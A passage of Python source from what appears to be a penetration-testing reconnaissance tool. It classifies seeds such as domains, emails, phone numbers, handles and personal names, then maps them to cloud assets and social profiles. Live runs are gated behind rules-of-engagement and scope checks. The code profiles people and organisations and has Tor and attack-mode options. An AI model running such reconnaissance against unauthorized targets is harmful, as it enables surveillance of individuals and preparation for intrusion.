        raise typer.BadParameter("--report-max-loops must be zero or greater.")
    sensitive_live_mode = bool(not dry_run_all and (active_recon or auto_run_detected))
    require_scope_manifest = sensitive_live_mode or (
        not dry_run_all
        and str(os.environ.get("FORGE_REQUIRE_SCOPE_MANIFEST", "")).strip().lower()
        in {"1", "true", "yes", "on"}
    )
    if sensitive_live_mode and not roe_id:
        raise typer.BadParameter(
            "live --attack-mode or --auto-run-detected requires --roe-id or FORGE_ROE_ID. "
            "Use --dry-run to preview without live execution."
        )
    if require_scope_manifest and not scope_manifest:
        raise typer.BadParameter(
            "live --attack-mode or --auto-run-detected requires --scope-manifest or "
            "FORGE_SCOPE_MANIFEST so live execution is bounded to explicit authorization. "
            "Use --dry-run to preview without live execution."
        )
    try:
        parallel_workers = max(1, min(4, int(parallel_fanout or 2)))
    except (TypeError, ValueError):
        parallel_workers = 2
    module_timeout_seconds = _module_subprocess_timeout_seconds()
    identity_lookup_workers = _identity_lookup_max_workers()
    validation_workers = _validation_max_workers()
    import sys as _sys_kc  # noqa: PLC0415

    from forge.config import ForgeConfig  # noqa: PLC0415
    from pathlib import Path as _Path  # noqa: PLC0415
    import re as _re  # noqa: PLC0415
    import socket as _socket  # noqa: PLC0415
    import ipaddress as _ipaddress  # noqa: PLC0415
    _COMPANY_SUFFIXES = {
        "co",
        "company",
        "corp",
        "corporation",
        "group",
        "holdings",
        "inc",
        "incorporated",
        "llc",
        "limited",
        "ltd",
        "plc",
        "pte",
        "pty",
    }
    _SOCIAL_PLATFORM_DOMAINS = (
        "about.me",
        "bitbucket.org",
        "bsky.app",
        "bsky.social",
        "dev.to",
        "facebook.com",
        "threads.com",
        "threads.net",
        "github.com",
        "gitlab.com",
        "gravatar.com",
        "instagram.com",
        "keybase.io",
        "linkedin.com",
        "medium.com",
        "news.ycombinator.com",
        "reddit.com",
        "t.me",
        "telegram.me",
        "twitter.com",
        "x.com",
        "youtube.com",
    )
    _MASTODON_INSTANCE_DOMAINS = (
        "fosstodon.org",
        "hachyderm.io",
        "infosec.exchange",
        "mas.to",
        "mastodon.cloud",
        "mastodon.online",
        "mastodon.social",
        "mstdn.party",
        "mstdn.social",
    )
    _MANAGED_CLOUD_PROVIDER_DOMAINS = (
        "amplifyapp.com",
        "amazonaws.com",
        "appspot.com",
        "blob.core.windows.net",
        "cloudfunctions.net",
        "digitaloceanspaces.com",
        "dfs.core.windows.net",
        "firebaseapp.com",
        "firebasestorage.googleapis.com",
        "firebaseio.com",
        "github.io",
        "gitlab.io",
        "netlify.com",
        "netlify.app",
        "pages.dev",
        "r2.cloudflarestorage.com",
        "r2.dev",
        "storage.cloud.google.com",
        "storage.googleapis.com",
        "supabase.co",
        "vercel.app",
        "web.core.windows.net",
        "web.app",
        "workers.dev",
    )
    _AWS_S3_URL_PATTERNS = (
        _re.compile(
            r"https?://([a-z0-9.\-]+)\.s3(?:[.-][a-z0-9-]+)?\.amazonaws\.com(?:/|$)",
            _re.IGNORECASE,
        ),
        _re.compile(
            r"https?://s3(?:[.-][a-z0-9-]+)?\.amazonaws\.com/([a-z0-9.\-]{3,63})(?:/|$)",
            _re.IGNORECASE,
        ),
        _re.compile(
            r"https?://([a-z0-9.\-]+)\.s3-website(?:[.-][a-z0-9-]+)?\.amazonaws\.com(?:/|$)",
            _re.IGNORECASE,
        ),
        _re.compile(
            r"https?://s3-website(?:[.-][a-z0-9-]+)?\.amazonaws\.com/([a-z0-9.\-]{3,63})(?:/|$)",
            _re.IGNORECASE,
        ),
    )
    _DO_SPACES_URL_PATTERNS = (
        _re.compile(
            r"https?://([a-z0-9.\-]{3,63})\.([a-z0-9\-]+)\.digitaloceanspaces\.com(?:/|$)",
            _re.IGNORECASE,
        ),
        _re.compile(
            r"https?://([a-z0-9\-]+)\.digitaloceanspaces\.com/([a-z0-9.\-]{3,63})(?:/|$)",
            _re.IGNORECASE,
        ),
    )
    _GCS_URL_PATTERNS = (
        _re.compile(
            r"https?://storage\.googleapis\.com/([a-zA-Z0-9._\-]{3,222})(?:/|$)",
            _re.IGNORECASE,
        ),
        _re.compile(
            r"https?://([a-zA-Z0-9._\-]{3,222})\.storage\.googleapis\.com(?:/|$)",
            _re.IGNORECASE,
        ),
        _re.compile(
            r"https?://storage\.cloud\.google\.com/([a-zA-Z0-9._\-]{3,222})(?:/|$)",
            _re.IGNORECASE,
        ),
        _re.compile(
            r"https?://firebasestorage\.googleapis\.com/(?:v0/)?b/([a-zA-Z0-9._\-]{3,222})/o(?:[/?#]|$)",
            _re.IGNORECASE,
        ),
    )
    _AZURE_BLOB_URL_PATTERNS = (
        _re.compile(
            r"https?://([a-z0-9\-]{3,24})\.blob\.core\.windows\.net/([^/?#]+)",
            _re.IGNORECASE,
        ),
    )
    _AZURE_STATIC_WEBSITE_HOST_RE = _re.compile(
        r"^([a-z0-9\-]{3,24})(?:\.[a-z0-9\-]+)?\.web\.core\.windows\.net$",
        _re.IGNORECASE,
    )

    # ─── Classify the seed and derive routing context ─────────────────
    def _looks_like_company_name(value: str) -> bool:
        tokens = [token.strip(".,") for token in value.strip().split() if token.strip(".,")]
        if len(tokens) < 2:
            return False
        return any(token.lower() in _COMPANY_SUFFIXES for token in tokens)

    def _looks_like_person_name(value: str) -> bool:
        tokens = [token for token in value.strip().split() if token]
        if len(tokens) < 2 or len(tokens) > 4:
            return False
        if any(token.lower().strip(".,") in _COMPANY_SUFFIXES for token in tokens):
            return False
        return all(_re.match(r"^[A-Za-z][A-Za-z\-']*$", token) for token in tokens)

    def _classify_seed(value: str) -> str:
        v = value.strip()
        if _re.match(r"^\+\d{6,15}$", v):
            return "phone"
        if _re.match(r"^@[a-zA-Z0-9_.\-]{2,32}$", v):
            return "username"
        try:
            parsed_ip = ipaddress.ip_address(v)
            return "ipv6" if parsed_ip.version == 6 else "ipv4"
        except ValueError:
            pass
        parsed = urlparse(v)
        if parsed.scheme in {"http", "https"} and parsed.netloc:
            if _is_mobile_bundle_url(v):
                return "apk_url"
            return "url"
        if _re.match(r"^[^\s@]+@[^\s@]+\.[^\s@]+$", v):
            return "email"
        if _re.match(r"^[a-z0-9]([a-z0-9\-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9\-]*[a-z0-9])?)+$",
                     v.lower()):
            return "domain"
        if _looks_like_company_name(v):
            return "company"
        if _looks_like_person_name(v):
            return "name"
        raise typer.BadParameter(
            f"cannot classify seed {value!r}. Give a domain, URL, IPv4/IPv6, email, "
            "phone (+NNN...), username (@handle), company name, or full name in quotes."
        )

    def _normalize_root_domain(host: str) -> str:
        labels = [part for part in host.lower().strip(".").split(".") if part]
        if len(labels) >= 2:
            return ".".join(labels[-2:])
        return host.lower().strip(".")

    def _host_context_json(
        discovery: str,
        *,
        synthetic_ip: bool = False,
        **extra: Any,
    ) -> str:
        payload: dict[str, Any] = {"discovery": discovery}
        if synthetic_ip:
            payload["synthetic_ip"] = True
        payload.update(extra)
        return json.dumps(payload)

    def _is_placeholder_host_ip(value: str) -> bool:
        text = str(value or "").strip()
        if not text or text in {"0.0.0.0", "::", "::0"}:
            return True
        try:
            parsed_ip = _ipaddress.ip_address(text)
        except ValueError:
            return False
        if parsed_ip.is_unspecified:
            return True
        if parsed_ip.version == 4 and parsed_ip in _ipaddress.ip_network("198.18.0.0/15"):
            return True
        return False

    def _excluded_host_for_seed_routing(hostname: str) -> bool:
        host = hostname.strip().lower().lstrip(".")
        if host.startswith("www."):
            host = host[4:]
        if any(host == domain or host.endswith(f".{domain}") for domain in _SOCIAL_PLATFORM_DOMAINS):
            return True
        if (
            any(host == domain or host.endswith(f".{domain}") for domain in _MASTODON_INSTANCE_DOMAINS)
            or host.startswith("mastodon.")
            or host.startswith("mstdn.")
        ):
            return True
        return any(host == domain or host.endswith(f".{domain}") for domain in _MANAGED_CLOUD_PROVIDER_DOMAINS)

    initial_seed_values: list[str] = []
    for raw_seed in [seed, *(related_seed or [])]:
        value = raw_seed.strip()
        if value:
            initial_seed_values.append(value)

    def _derive_hostname_for_seed(value: str, kind: str, *, allow_email_domain: bool = True) -> str:
        if kind == "domain":
            hostname = value.lower().strip().strip(".")
        elif kind == "subdomain":
            hostname = value.lower().strip().strip(".")
        elif kind in {"url", "apk_url"}:
            parsed = urlparse(value)
            hostname = str(parsed.hostname or "").strip().lower().strip(".")
        elif kind == "email" and allow_email_domain:
            hostname = value.split("@", 1)[1].lower().strip().strip(".")
        else:
            hostname = ""
        if not hostname or "." not in hostname or _excluded_host_for_seed_routing(hostname):
            return ""
        return hostname

    def _derive_domain_for_seed(value: str, kind: str, *, allow_email_domain: bool = True) -> str:
        hostname = _derive_hostname_for_seed(
            value,
            kind,
            allow_email_domain=allow_email_domain,
        )
        if hostname:
            return _normalize_root_domain(hostname)
        if kind in {"ipv4", "ipv6"}:
            try:
                hostname, _a, _l = _socket.gethostbyaddr(value)
                return _normalize_root_domain(hostname) if "." in hostname else ""
            except (_socket.herror, _socket.gaierror, OSError):
                return ""
        return ""

    def _prepare_classified_seed(seed_value: str) -> dict[str, str]:
        value = str(seed_value or "").strip()
        seed_type_value = _classify_seed(value)
        return {
            "value": _canonical_initial_seed_value(value, seed_type_value),
            "seed_type": seed_type_value,
        }

    def _canonical_initial_seed_value(seed_value: str, seed_type_value: str) -> str:
        value = str(seed_value or "").strip()
        if seed_type_value == "email":
            return value.lower()
        if seed_type_value == "domain":
            return value.lower().strip(".")
        if seed_type_value in {"ipv4", "ipv6"}:
            try:
                return str(ipaddress.ip_address(value))
            except ValueError:
                return value.lower()
        return value

    def _initial_seed_dedupe_key(seed_entry: dict[str, str]) -> tuple[str, str]:
        entry_type = str(seed_entry.get("seed_type") or "").strip()
        entry_value = str(seed_entry.get("value") or "").strip()
        if entry_type == "username":
            return entry_type, entry_value.lower().lstrip("@")
        if entry_type in {"name", "company"}:
            return entry_type, " ".join(entry_value.casefold().split())
        return entry_type, entry_value.lower()

    def _dedupe_initial_seed_entries(seed_entries: list[dict[str, str]]) -> list[dict[str, str]]:
        deduped: list[dict[str, str]] = []
        seen: set[tuple[str, str]] = set()
        for seed_entry in seed_entries:
            key = _initial_seed_dedupe_key(seed_entry)
            if not key[1] or key in seen:
                continue
            seen.add(key)
            deduped.append(seed_entry)
        return deduped

    def _prepare_initial_seed_route(seed_entry: dict[str, str]) -> dict[str, Any]:
        seed_value = str(seed_entry["value"])
        entry_type = str(seed_entry["seed_type"])
        return {
            "value": seed_value,
            "seed_type": entry_type,
            "scope_values": [seed_value, f"*.{seed_value}"] if entry_type == "domain" else [seed_value],
            "derived_domain": _derive_domain_for_seed(seed_value, entry_type),
            "username_seed": seed_value.lstrip("@") if entry_type == "username" else "",
            "phone_seed": seed_value if entry_type == "phone" else "",
            "name_seed": seed_value if entry_type == "name" else "",
            "company_seed": seed_value if entry_type == "company" else "",
            "ip_seed": seed_value.strip().lower() if entry_type in {"ipv4", "ipv6"} else "",
        }

    classified_seed_candidates = _run_inprocess_batch(
        initial_seed_values,
        _prepare_classified_seed,
        max_workers=parallel_workers,
        progress_label="initial seed classification prep",
    )
    classified_seeds = _dedupe_initial_seed_entries(classified_seed_candidates)
    seed = str(classified_seeds[0]["value"])
    seed_type = str(classified_seeds[0]["seed_type"])
    prepared_initial_seed_routes = _run_inprocess_batch(
        classified_seeds,
        _prepare_initial_seed_route,
        max_workers=parallel_workers,
        progress_label="initial seed routing prep",
    )
    additional_seed_routes = prepared_initial_seed_routes[1:]
    scope_manifest_metadata: dict[str, Any] | None = None
    scope_manifest_validation: dict[str, Any] = {"authorized": [], "denied": []}
    if scope_manifest:
        try:
            scope_manifest_metadata = _load_scope_manifest(scope_manifest)
            manifest_roe_id = str(scope_manifest_metadata.get("roe_id") or "").strip()
            if manifest_roe_id and roe_id and manifest_roe_id != roe_id:
                raise ValueError(
                    f"scope manifest roe_id {manifest_roe_id!r} does not match --roe-id {roe_id!r}"
                )
            scope_manifest_validation = _validate_scope_manifest_seed_values(
                scope_manifest_metadata,
                classified_seeds,
            )
        except Exception as exc:  # noqa: BLE001
            raise typer.BadParameter(f"invalid --scope-manifest: {exc}") from exc
        denied_seed_values = [
            f"{item['seed_value']} ({item['seed_type']})"
            for item in scope_manifest_validation.get("denied", [])
            if isinstance(item, dict)
        ]
        if denied_seed_values:
            denied_preview = ", ".join(denied_seed_values[:5])
            raise typer.BadParameter(
                "scope manifest does not authorize initial seed(s): "
                f"{denied_preview}. Update the manifest or use --dry-run."
            )

    def _extract_cloud_asset_seed_refs(value: str) -> list[tuple[str, str]]:
        parsed = urlparse(str(value or "").strip())
        if parsed.scheme not in {"http", "https"} or not parsed.netloc:
            return []
        url = str(value or "").strip()
        hostname = str(parsed.hostname or "").strip().lower().strip(".")
        refs: list[tuple[str, str]] = []
        seen: set[tuple[str, str]] = set()

        def _append(asset_type: str, identifier: str) -> None:
            key = (str(asset_type or "").strip().lower(), str(identifier or "").strip().lower())
            if key[0] and key[1] and key not in seen:
                seen.add(key)
                refs.append(key)

        if hostname.endswith(".supabase.co"):
            project_ref = hostname.split(".supabase.co", 1)[0].strip(".")
            _append("supabase", project_ref)
        for firebase_suffix in (".firebaseio.com", ".firebaseapp.com", ".web.app"):
            if hostname.endswith(firebase_suffix):
                project_ref = hostname.split(firebase_suffix, 1)[0].strip(".")
                _append("firebase", project_ref)
                break
        for asset_type, pattern in (
            ("amplify", _re.compile(r"^([a-z0-9\-]+)\.amplifyapp\.com$", _re.IGNORECASE)),
            ("gcp_appspot", _re.compile(r"^([a-z0-9\-]+)(?:\.[a-z0-9\-]+)?\.appspot\.com$", _re.IGNORECASE)),
            (
                "gcp_cloudfunctions",
                _re.compile(r"^[a-z0-9\-]+-([a-z0-9\-]+)\.cloudfunctions\.net$", _re.IGNORECASE),
            ),
            ("cloudflare_pages", _re.compile(r"^([a-z0-9\-]+)\.pages\.dev$", _re.IGNORECASE)),
            (
                "cloudflare_worker",
                _re.compile(
                    r"^[a-z0-9][a-z0-9\-]*(?:\.[a-z0-9][a-z0-9\-]*)+\.workers\.dev$",
                    _re.IGNORECASE,
                ),
            ),
            (
                "cloudflare_r2",
                _re.compile(
                    r"^[a-z0-9][a-z0-9\-]*(?:\.[a-z0-9][a-z0-9\-]*)?\.r2\.(?:dev|cloudflarestorage\.com)$",
                    _re.IGNORECASE,
                ),
            ),
            ("github_pages", _re.compile(r"^[a-z0-9][a-z0-9\-]*\.github\.io$", _re.IGNORECASE)),
            (
                "gitlab_pages",
                _re.compile(
                    r"^[a-z0-9][a-z0-9\-]*(?:\.[a-z0-9][a-z0-9\-]*)*\.gitlab\.io$",
                    _re.IGNORECASE,
                ),
            ),
            ("netlify", _re.compile(r"^([a-z0-9\-]+)\.netlify\.(?:app|com)$", _re.IGNORECASE)),
            ("vercel", _re.compile(r"^([a-z0-9\-]+)\.vercel\.app$", _re.IGNORECASE)),
        ):
            match = pattern.fullmatch(hostname)
            if not match:
                continue
            project_ref = (
                hostname
                if asset_type in {"cloudflare_worker", "cloudflare_r2", "github_pages", "gitlab_pages"}
                else str(match.group(1) or "").strip(".")
            )
            if asset_type == "gcp_cloudfunctions":
                path = str(parsed.path or "").rstrip("/")
                _append(asset_type, f"{parsed.scheme}://{hostname}{path}")
            else:
                _append(asset_type, project_ref)
            break
        for pattern in _AWS_S3_URL_PATTERNS:
            match = pattern.search(url)
            if match:
                _append("aws_s3", match.group(1))
                break
        for pattern in _DO_SPACES_URL_PATTERNS:
            match = pattern.search(url)
            if not match:
                continue
            if pattern is _DO_SPACES_URL_PATTERNS[0]:
                bucket, region = match.group(1), match.group(2)
            else:
                region, bucket = match.group(1), match.group(2)
            _append("do_spaces", f"{region}/{bucket}")
            break
        for pattern in _GCS_URL_PATTERNS:
            match = pattern.search(url)
            if match:
                _append("gcs", match.group(1))
                break
        static_site_match = _AZURE_STATIC_WEBSITE_HOST_RE.fullmatch(hostname)
        if static_site_match:
            _append("azure_blob", f"{static_site_match.group(1)}/$web")
        for pattern in _AZURE_BLOB_URL_PATTERNS:
            match = pattern.search(url)
            if match:
                _append("azure_blob", f"{match.group(1)}/{match.group(2)}")
                break
        return refs

    def _promote_cloud_asset_seed_refs(con: Any, seed_value: str) -> None:
        for asset_type, identifier in _extract_cloud_asset_seed_refs(seed_value):
            try:
                con.execute(
                    """
                    INSERT OR IGNORE INTO cloud_assets
                        (engagement_id, asset_type, identifier, provider_identifier, source)
                    VALUES (?, ?, ?, ?, 'kill_chain_seed_url')
                    """,
                    (engagement_id, asset_type, identifier, identifier),
                )
            except Exception:  # noqa: BLE001
                pass

    def _lookup_engagement_seed_id(con: Any, seed_value: str, seed_type: str) -> int | None:
        try:
            row = con.execute(
                """
                SELECT id
                FROM engagement_seeds
                WHERE engagement_id=? AND seed_value=? AND seed_type=?
                LIMIT 1
                """,
                (engagement_id, seed_value, seed_type),
            ).fetchone()
        except Exception:  # noqa: BLE001
            return None
        if not row:
            return None
        try:
            return int(row[0])
        except (TypeError, ValueError, IndexError):
            return None

    def _insert_seed_relation(
        con: Any,
        source_seed_id: int | None,
        target_seed_id: int | None,
        *,
        relation_type: str,
        confidence: float,
        evidence: dict[str, object],
    ) -> None:
        if (
            source_seed_id is None
            or target_seed_id is None
            or source_seed_id == target_seed_id
        ):
            return
        try:
            con.execute(
                """
                INSERT OR IGNORE INTO seed_relations
                    (engagement_id, source_seed_id, target_seed_id, relation_type, confidence, evidence_json)
                VALUES (?, ?, ?, ?, ?, ?)
                """,
                (
                    engagement_id,
                    source_seed_id,
                    target_seed_id,
                    relation_type,
                    float(confidence),
                    json.dumps(evidence, sort_keys=True),
                ),
            )
        except Exception:  # noqa: BLE001
            return

    def _promote_social_url_seed_refs(
        con: Any,
        seed_value: str,
        entry_type: str,
        *,
        evidence_rule: str = "social_url_extract",
    ) -> None:
        from forge.engagement_orchestrator import (  # noqa: PLC0415
            EngagementSynthesisEngine as _EngagementSynthesisEngine,
            _classify_seed_value as _classify_engagement_seed_value,
        )

        profile_stub = {"profile_url": seed_value}
        platform = _EngagementSynthesisEngine._social_profile_platform_hint(profile_stub)
        if not platform:
            return
        url_seed_id = _lookup_engagement_seed_id(con, seed_value, entry_type)
        if url_seed_id is None:
            return

        handle = _EngagementSynthesisEngine._extract_social_profile_handle_from_url(seed_value)
        if handle:
            _upsert_engagement_seed(
                con,
                handle,
                "username",
                source="cross_reference",
                status="pending",
                depth=1,
                confidence=0.78,
            )
            username_seed_id = _lookup_engagement_seed_id(con, handle, "username")
            _insert_seed_relation(
                con,
                url_seed_id,
                username_seed_id,
                relation_type="derived_from",
                confidence=0.78,
                evidence={"rule": evidence_rule, "platform": platform},
            )

            domain_handle = str(handle or "").strip().lower()
            if platform == "bluesky" and _classify_engagement_seed_value(domain_handle) == "domain":
                _upsert_engagement_seed(
                    con,
                    domain_handle,
                    "domain",
                    source="cross_reference",
                    status="pending",
                    depth=1,
                    confidence=0.82,
                )
                domain_seed_id = _lookup_engagement_seed_id(con, domain_handle, "domain")
                _insert_seed_relation(
                    con,
                    url_seed_id,
                    domain_seed_id,
                    relation_type="derived_from",
                    confidence=0.82,
                    evidence={
                        "rule": "social_profile_domain_handle",
                        "platform": platform,
                        "source_rule": evidence_rule,
                    },
                )

        company_name = _EngagementSynthesisEngine._social_profile_company_name(
            profile_stub,
            source_label="operator_seed_url",
            platform=platform,
        )
        if company_name:
            _upsert_engagement_seed(
                con,
                company_name,
                "company",
                source="cross_reference",
                status="pending",
                depth=1,
                confidence=0.76,
            )
            company_seed_id = _lookup_engagement_seed_id(con, company_name, "company")
            _insert_seed_relation(
                con,
                url_seed_id,
                company_seed_id,
                relation_type="derived_from",
                confidence=0.76,
                evidence={"rule": evidence_rule, "platform": platform},
            )

        full_name = _EngagementSynthesisEngine._social_profile_name(profile_stub)
        if full_name:
            _upsert_engagement_seed(
                con,
                full_name,
                "name",
                source="cross_reference",
                status="pending",
                depth=1,
                confidence=0.74,
            )
            name_seed_id = _lookup_engagement_seed_id(con, full_name, "name")
            _insert_seed_relation(
                con,
                url_seed_id,
                name_seed_id,
                relation_type="derived_from",
                confidence=0.74,
                evidence={"rule": evidence_rule, "platform": platform},
            )

    def _promote_email_localpart_seed_refs(
        con: Any,
        email_value: str,
        usernames: Iterable[str],
    ) -> None:
        normalized_email = str(email_value or "").strip().lower()
        if not normalized_email or "@" not in normalized_email:
            return
        handles = [
            str(username or "").strip()
            for username in usernames
            if str(username or "").strip()
        ]
        if not handles:
            return

        email_seed_id = _lookup_engagement_seed_id(con, normalized_email, "email")
        if email_seed_id is None:
            _upsert_engagement_seed(
                con,
                normalized_email,
                "email",
                source="discovered",
                status="pending",
                depth=1,
                confidence=0.9,
            )
            email_seed_id = _lookup_engagement_seed_id(con, normalized_email, "email")
        if email_seed_id is None:
            return

        for handle in handles:
            username_seed_id = _lookup_engagement_seed_id(con, handle, "username")
            if username_seed_id is None:
                _upsert_engagement_seed(
                    con,
                    handle,
                    "username",
                    source="cross_reference",
                    status="pending",
                    depth=2,
                    confidence=0.72,
                )
                username_seed_id = _lookup_engagement_seed_id(con, handle, "username")
            _insert_seed_relation(
                con,
                email_seed_id,
                username_seed_id,
                relation_type="derived_from",
                confidence=0.72,
                evidence={"rule": "email_localpart_username"},
            )

    # ─── Auto-derive engagement ID if omitted ────────────────────────
    # Uses the same monotonic sequence as the web API/dashboard create path.
    # Also auto-creates the engagement row using the seed as the scope entry
    # (idempotent — INSERT OR IGNORE on the id).
    cfg = ForgeConfig.load()
    _eng_dir = cfg.data_dir / "engagements"
    _eng_dir.mkdir(parents=True, exist_ok=True)
    if not engagement:
        from forge.engagement_ids import allocate_engagement_id  # noqa: PLC0415

        engagement = str(allocate_engagement_id(cfg.data_dir))
        console.print(f"[bold cyan]Auto-assigned engagement id:[/bold cyan] {engagement}")

    # Ensure the engagement row exists (create if missing so downstream
    # scope_gate / audit_log FKs don't fail on a fresh ID).
    import sqlite3 as _sq_init  # noqa: PLC0415
    _db_path_init = cfg.engagement_db_path(engagement)
    _fresh = not _db_path_init.exists()
    if _fresh:
        from forge.db.schema import apply_schema  # noqa: PLC0415
        _con_init = _sq_init.connect(str(_db_path_init))
        try:
            apply_schema(_con_init)
            try:
                from forge.db.migrations import run_migrations  # noqa: PLC0415
                run_migrations(_con_init)
            except Exception:  # noqa: BLE001
                pass
            import json as _json_init  # noqa: PLC0415
            _scope_list: list[str] = []
            for prepared_seed in prepared_initial_seed_routes:
                for scope_value in prepared_seed["scope_values"]:
                    if scope_value not in _scope_list:
                        _scope_list.append(scope_value)
            try:
                _con_init.execute(
                    "INSERT OR IGNORE INTO engagements "
                    "(id, name, scope_json, status, operator) "
                    "VALUES (?, ?, ?, 'ACTIVE', ?)",
                    (int(engagement), f"auto:{seed_type}:{seed[:30]}",
                     _json_init.dumps(_scope_list), cfg.operator),
                )
                _con_init.commit()
            except (_sq_init.OperationalError, _sq_init.IntegrityError):
                pass
        finally:
            _con_init.close()
        console.print(f"[dim]Auto-created engagement {engagement} "
                      f"(seed_type={seed_type})[/dim]")
    # Derive the "domain" that legacy fan-outs (subdomain enum, DNS,
    # Wayback, RDAP, harvest, crawler) expect. For non-domain seeds we
    # skip those fan-outs and route to specialised modules instead.
    domain = str(prepared_initial_seed_routes[0]["derived_domain"] or "")
    import sqlite3 as _sq  # noqa: PLC0415
    import time as _time  # noqa: PLC0415

    cfg = ForgeConfig.load()
    db_path = cfg.engagement_db_path(engagement)
    engagement_id = int(engagement)
    progress_event_queue = None
    if cfg.redis_url:
        try:
            from forge.distributed.coordinator import QueueCoordinator  # noqa: PLC0415

            progress_event_queue = QueueCoordinator(redis_url=cfg.redis_url)
        except Exception:  # noqa: BLE001
            progress_event_queue = None
    try:
        from forge.db.migrations import run_migrations as _run_migrations  # noqa: PLC0415
        from forge.db.schema import apply_schema as _apply_schema  # noqa: PLC0415

        _con_schema = _sq.connect(str(db_path))
        try:
            _apply_schema(_con_schema)
            _run_migrations(_con_schema)
        finally:
            _con_schema.close()
    except Exception:  # noqa: BLE001
        pass
    step_start = _time.time()
    _tor_prefix = [] if use_tor else ["--no-tor"]
    root_domains: list[str] = []
    if domain:
        root_domains.append(domain)
    for prepared_seed in prepared_initial_seed_routes:
        derived_domain = str(prepared_seed["derived_domain"] or "")
        if derived_domain and derived_domain not in root_domains:
            root_domains.append(derived_domain)
    extra_username_seeds = [
        str(item["username_seed"])
        for item in additional_seed_routes
        if item["username_seed"]
    ]
    extra_phone_seeds = [
        str(item["phone_seed"])
        for item in additional_seed_routes
        if item["phone_seed"]
    ]
    extra_name_seeds = [
        str(item["name_seed"])
        for item in additional_seed_routes
        if item["name_seed"]
    ]
    extra_company_seeds = [
        str(item["company_seed"])
        for item in additional_seed_routes
        if item["company_seed"]
    ]
    extra_ip_seeds = [
        str(item["ip_seed"])
        for item in additional_seed_routes
        if item["ip_seed"]
    ]
    processed_emails: set[str] = set()
    processed_social_handles: set[str] = set()
    processed_keyscan_targets: set[str] = set()
    processed_cloud_refs: set[str] = set()
    processed_phone_seeds: set[str] = set()
    processed_ip_seeds: set[str] = set()
    processed_username_seeds: set[str] = set()
    processed_name_seeds: set[str] = set()
    processed_company_seeds: set[str] = set()
    last_iteration = 0
    engagement_run_tracker = None
    engagement_run_handle = None
    run_progress_state: dict[str, object] = {
        "phase": "bootstrap",
        "last_step": "",
        "last_message": "",
        "last_step_elapsed_seconds": 0.0,
        "last_step_at": "",
        "active_batch_label": "",
        "active_batch_eta_seconds": None,
        "active_artifact_stage_label": "",
        "active_artifact_eta_seconds": None,
        "active_validation_stage_label": "",
        "active_validation_eta_seconds": None,
        "active_finalization_stage_label": "",
        "active_finalization_eta_seconds": None,
        "recent_steps": [],
        "counts": {},
        "queue_metrics": {},
        "pending_work_counts": {},
        "pending_work_total": 0,
        "last_iteration_delta": {},
        "last_iteration_stable": None,
    }
    _SNAPSHOT_LABELS = (
        "hosts",
        "emails",
        "subdomains",
        "services",
        "key_findings",
        "crawl_results",
        "github_findings",
        "social_profiles",
        "engagement_seeds",
        "seed_relations",
    )

    def _strip_console_markup(value: str) -> str:
        cleaned = _re.sub(r"\[[^\]]+\]", "", str(value or ""))
        collapsed = " ".join(cleaned.split())
        return collapsed.strip()

    def _infer_run_phase(step: str) -> str:
        lowered = _strip_console_markup(step).lower()
        if not lowered:
            return str(run_progress_state.get("phase") or "running")
        match = _re.match(r"^iteration\s+(\d+)", lowered)
        if match:
            return f"iteration_{match.group(1)}"
        match = _re.match(r"^(\d+)\.", lowered)
        if match:
            return f"iteration_{match.group(1)}"
        normalized = _re.sub(r"[^a-z0-9]+", "_", lowered).strip("_")
        return normalized or str(run_progress_state.get("phase") or "running")

    def _live_execution_policy_metadata() -> dict[str, object]:
        live_allowed = not dry_run_all
        requires_roe = bool(active_recon or credential_validate or auto_run_detected)
        authorized_seed_count = 0
        denied_seed_count = 0
        if isinstance(scope_manifest_validation, dict):
            authorized_seed_count = len(scope_manifest_validation.get("authorized") or [])
            denied_seed_count = len(scope_manifest_validation.get("denied") or [])
        return {
            "policy_version": 1,
            "scope_gate": "engagement_scope_json_root_domains",
            "roe_id": roe_id,
            "roe_present": bool(roe_id),
            "scope_manifest_required": bool(require_scope_manifest),
            "scope_manifest_present": bool(scope_manifest_metadata),
            "scope_manifest_source": (
                str(scope_manifest_metadata.get("source") or "")
                if isinstance(scope_manifest_metadata, dict)
                else ""
            ),
            "scope_manifest_roe_id": (
                str(scope_manifest_metadata.get("roe_id") or "")
                if isinstance(scope_manifest_metadata, dict)
                else ""
            ),
            "scope_manifest_authorized_seed_count": authorized_seed_count,
            "scope_manifest_denied_seed_count": denied_seed_count,
            "live_probing_allowed": live_allowed,
            "tool_execution_allowed": live_allowed,
            "active_recon_allowed": bool(active_recon and live_allowed),
            "credential_validation_allowed": bool(credential_validate and live_allowed),
            "auto_run_detected_allowed": bool(auto_run_detected and live_allowed),
            "destructive_actions_allowed": False,
            "post_exploitation_allowed": False,
            "requires_explicit_roe": requires_roe,
            "roe_missing": bool(requires_roe and not roe_id),
        }

    def _engagement_run_metadata(*, phase: str | None = None) -> dict[str, object]:
        active_phase = str(phase or run_progress_state.get("phase") or "running")
        recent_steps = run_progress_state.get("recent_steps")
        if not isinstance(recent_steps, list):
            recent_steps = []
        counts = run_progress_state.get("counts")
        if not isinstance(counts, dict):
            counts = {}
        queue_metrics = run_progress_state.get("queue_metrics")
        if not isinstance(queue_metrics, dict):
            queue_metrics = {}
        pending_work_counts = run_progress_state.get("pending_work_counts")
        if not isinstance(pending_work_counts, dict):
            pending_work_counts = {}
        last_iteration_delta = run_progress_state.get("last_iteration_delta")
        if not isinstance(last_iteration_delta, dict):
            last_iteration_delta = {}
        last_iteration_stable = run_progress_state.get("last_iteration_stable")
        active_batch_eta_seconds = run_progress_state.get("active_batch_eta_seconds")
        active_artifact_eta_seconds = run_progress_state.get("active_artifact_eta_seconds")
        active_validation_eta_seconds = run_progress_state.get("active_validation_eta_seconds")
        active_finalization_eta_seconds = run_progress_state.get("active_finalization_eta_seconds")
        return {
            "phase": active_phase,
            "seed_values": initial_seed_values,
            "root_domains": list(root_domains),
            "processed_emails": len(processed_emails),
            "processed_social_handles": len(processed_social_handles),
            "processed_keyscan_targets": len(processed_keyscan_targets),
            "processed_cloud_refs": len(processed_cloud_refs),
            "processed_phone_seeds": len(processed_phone_seeds),
            "processed_ip_seeds": len(processed_ip_seeds),
            "processed_username_seeds": len(processed_username_seeds),
            "processed_name_seeds": len(processed_name_seeds),
            "processed_company_seeds": len(processed_company_seeds),
            "parallel_fanout": parallel_workers,
            "skip_cloud": skip_cloud,
            "skip_keyscan": skip_keyscan,
            "resume_enabled": resume_enabled,
            "dry_run": dry_run_all,
            "attack_mode": attack_mode,
            "roe_id": roe_id,
